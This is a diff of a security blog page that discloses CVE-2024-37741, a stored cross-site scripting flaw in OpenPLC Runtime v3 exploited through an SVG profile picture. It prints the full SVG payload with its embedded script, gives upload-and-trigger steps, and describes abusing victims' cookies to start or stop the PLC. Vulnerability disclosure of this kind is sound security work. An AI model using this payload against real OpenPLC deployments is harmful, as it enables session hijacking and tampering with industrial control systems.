@@ -10,8 +10,9 @@
 
   
     
-    <meta name="description" content="Description Reproduction Use this payload &amp; save it as image.svg:
-&lt;?xml version=&#34;1.0&#34; standalone=&#34;no&#34;?&gt; &lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt; &lt;svg version=&#34;1.1&#34; baseProfile=&#34;full&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt; &lt;polygon id=&#34;triangle&#34; points=&#34;0,0 0,50 50,0&#34; fill=&#34;#009900&#34; stroke=&#34;#004400&#34;/&gt; &lt;script type=&#34;text/javascript&#34;&gt; alert(&#34;XSS by 1d8&#34;); &lt;/script&gt; &lt;/svg&gt;   Login &gt; Users &gt; Select a user to edit Upload the image.svg as the picture Save changes Right-click the profile image in upper-right hand corner &gt; Open image in new tab  Our XSS payload is now executed">
+    <meta name="description" content="Description OpenPLC’s Runtime, version 3 (https://github.com/thiagoralves/OpenPLC_v3) is vulnerable to a cross-site scripting (XSS) vulnerability that affects user’s profile pictures. An attacker could upload a maliciously crafted .svg image file and gain code execution via Javascript. The CVE assigned for this particular vulnerability is CVE-2024-37741 and can be viewed here.
+Reproduction Use this payload &amp; save it as image.svg:
+&lt;?xml version=&#34;1.0&#34; standalone=&#34;no&#34;?&gt; &lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt; &lt;svg version=&#34;1.1&#34; baseProfile=&#34;full&#34; xmlns=&#34;http://www.">
   
 
   <link rel="apple-touch-icon" sizes="180x180" href="https://1d8.github.io/apple-touch-icon.png">
@@ -259,6 +260,7 @@
   <main id="main">
     <h1>CVE-2024-37741 - XSS on OpenPLC</h1>
     <h1 id="description">Description</h1>
+<p>OpenPLC&rsquo;s Runtime, version 3 (<a href="https://github.com/thiagoralves/OpenPLC_v3">https://github.com/thiagoralves/OpenPLC_v3</a>) is vulnerable to a cross-site scripting (XSS) vulnerability that affects user&rsquo;s profile pictures. An attacker could upload a maliciously crafted <code>.svg</code> image file and gain code execution via Javascript. The CVE assigned for this particular vulnerability is CVE-2024-37741 and can be viewed <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-37741">here</a>.</p>
 <h2 id="reproduction">Reproduction</h2>
 <p>Use this payload &amp; save it as image.svg:</p>
 <pre><code>&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;
@@ -277,6 +279,8 @@ alert(&quot;XSS by 1d8&quot;);
 <li>Right-click the profile image in upper-right hand corner &gt; Open image in new tab</li>
 </ol>
 <p>Our XSS payload is now executed</p>
+<h1 id="impact">Impact</h1>
+<p>Since we can inject our own Javascript, we can abuse the victim&rsquo;s cookie to do things such as start/stop the PLC or interact with the Slave device, or perform many other actions on the web application.</p>
 <h1 id="references">References</h1>
 <ul>
 <li><a href="https://github.com/thiagoralves/OpenPLC_v3/issues/242">https://github.com/thiagoralves/OpenPLC_v3/issues/242</a></li>
